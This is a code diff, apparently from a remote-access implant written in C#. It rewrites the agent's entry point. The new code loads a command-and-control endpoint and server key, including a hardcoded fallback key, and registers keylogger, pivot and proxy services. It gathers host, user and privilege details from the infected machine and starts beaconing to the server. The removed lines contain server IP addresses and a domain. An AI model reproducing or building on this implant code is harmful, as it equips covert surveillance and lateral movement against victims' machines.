@@ -1,4 +1,6 @@
-﻿using Agent.Models;
+﻿using Agent.Communication;
+using Agent.Models;
+using Agent.Service;
 using System;
 using System.Collections.Generic;
 using System.Diagnostics;
@@ -8,63 +10,100 @@ using System.Text;
 using System.Threading;
 using System.Threading.Tasks;
 
+#if SERVICE
+using System.ServiceProcess;
+#endif
+
 namespace Agent
 {
-    class Program
+    public class Entry
     {
+#if DEBUG
+        static string[] _args = new string[0];
+#endif
 
-        private static AgentMetadata s_metadata;
-        private static CommModule s_commModule;
-
-        private static CancellationTokenSource s_tokenSource = new CancellationTokenSource();
-
-        static void Main(string[] args)
+        public static void Main(string[] args)
         {
-            string server = "192.168.56.102";
-            int port = 443;
-            string protocol = "https";
-
-
-            //server = "gate.fropops.fr";
-            //port = 443;
-            //protocol = "https";
-
-            //server = "13.38.61.75";
-            //port = 80;
-            //server = "127.0.0.1";
-            //port = 8080;
-            //server = "192.168.56.102";
-            //port = 443;
-            //protocol = "http";
-
-
-            if (args.Length == 1)
-            {
-                var split = args[0].Split(':');
-                protocol = split[0];
-                server = split[1];
-                port = Convert.ToInt32(split[2]);
-            }
-
-            GenerateMetadata();
-
-            s_commModule = new HttpCommModule(protocol, server, port);
-            var agent = new Models.Agent(s_metadata, s_commModule);
-
-            Thread commThread = new Thread(s_commModule.Start);
-            Thread agentThread = new Thread(agent.Start);
-            commThread.Start();
-            agentThread.Start();
-
-            commThread.Join();
-            agentThread.Join();
+#if DEBUG
+            _args = args;
+            Start();
+#endif
         }
 
 
 
+        static Thread s_agentThread = null;
+
+        public static void Start()
+        {
+            string connUrl = Properties.Resources.EndPoint;
+            string serverKey = Properties.Resources.Key;
+#if DEBUG
+            Debug.Listeners.Add(new TextWriterTraceListener(Console.Out));
+
+            if (_args.Count() > 0)
+            {
+                connUrl = _args[0];
+                
+            }
+
+            if (_args.Count() > 1)
+            {
+                serverKey = _args[1];
+            }
+            else
+            {
+                serverKey = "1yOdEVXef7ljnzrRgINB27Bi4zGwi1v2B664b65hAO7elTTM";
+            }
+
+            //connUrl = "https://192.168.174.128";
+
+#endif
+            var connexion = ConnexionUrl.FromString(connUrl);
+
+            Debug.WriteLine($"Endpoint is {connUrl}.");
+            Debug.WriteLine($"ServerKey is {serverKey}.");
+
+            if (!connexion.IsValid)
+            {
+                Debug.WriteLine($"Endpoint {connUrl} is not valid, quiting...");
+                return;
+            }
+
+            var metaData = GenerateMetadata(connexion.ToString());
 
 
-        static void GenerateMetadata()
+            var configService = new ConfigService();
+            configService.ServerKey = serverKey;
+
+            ServiceProvider.RegisterSingleton<IConfigService>(configService);
+            ServiceProvider.RegisterSingleton<IMessageService>(new MessageService(metaData));
+            ServiceProvider.RegisterSingleton<IFileService>(new FileService());
+            ServiceProvider.RegisterSingleton<IWebHostService>(new WebHostService());
+
+            ServiceProvider.RegisterSingleton<IProxyService>(new ProxyService());
+            ServiceProvider.RegisterSingleton<IPivotService>(new PivotService());
+            ServiceProvider.RegisterSingleton<IKeyLogService>(new KeyLogService());
+
+            
+
+
+            var commModule = CommunicationFactory.CreateCommunicator(connexion);
+            var agent = new Models.Agent(metaData, commModule);
+
+            s_agentThread = new Thread(agent.Start);
+            s_agentThread.Start();
+            s_agentThread.Join();
+        }
+
+        private static void Stop()
+        {
+            // onstop code here
+            s_agentThread.Abort();
+        }
+
+
+        static AgentMetadata GenerateMetadata(string endpoint)
         {
             var process = Process.GetCurrentProcess();
             var userName = Environment.UserName;
@@ -81,17 +120,22 @@ namespace Agent
                 }
             }
 
-            s_metadata = new AgentMetadata()
+            AgentMetadata metadata = new AgentMetadata()
             {
-                Id = Guid.NewGuid().ToString(),
+                Id = ShortGuid.NewGuid(),
                 Hostname = Environment.MachineName,
                 UserName = userName,
                 ProcessId = process.Id,
                 ProcessName = process.ProcessName,
-                Architecture = Environment.Is64BitOperatingSystem ? "x64" : "x86",
+                Architecture = IntPtr.Size == 8 ? "x64" : "x86",
                 Integrity = integrity,
+                EndPoint = endpoint,
+                Version = "Net v2.6.0",
+                SleepInterval = endpoint.ToLower().StartsWith("http") ? 2 : 0, //pivoting agent
+                SleepJitter = 0
             };
 
+            return metadata;
         }
     }
 }
